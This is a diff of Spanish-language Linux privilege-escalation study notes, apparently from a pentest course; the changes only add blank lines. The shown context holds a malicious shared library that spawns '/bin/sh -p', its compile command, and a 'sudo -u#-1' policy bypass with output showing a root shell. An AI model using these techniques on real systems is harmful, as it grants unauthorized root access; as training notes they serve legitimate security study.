@@ -146,6 +146,7 @@ void dbquery() {
     system("/bin/sh -p");
 } 
 ```
+
 - `gcc src.c -fPIC -shared -o /development/libshared.so`
 
 ## Sudo policy bypass
@@ -153,6 +154,7 @@ void dbquery() {
 - El id especificado se encuentra en el fichero `/etc/passwd`.
 - Ejemplo: `cat /etc/passwd | grep cry0l1t3` => `cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash`
 - Podemos ver que este usuario tiene id 1005, si un id negativo entrase como sudo en procesar el id 0 que sería unicamente root.
+
 ```bash
 cry0l1t3@nix02:~$ sudo -u#-1 id
 
@@ -160,6 +162,7 @@ root@nix02:/home/cry0l1t3# id
 
 uid=0(root) gid=1005(cry0l1t3) groups=1005(cry0l1t3)
 ```
+
 - `sudo -u#-1` + binario permitido para ejecutar como root. = exploit
 
 ## Wildcards spare tricks
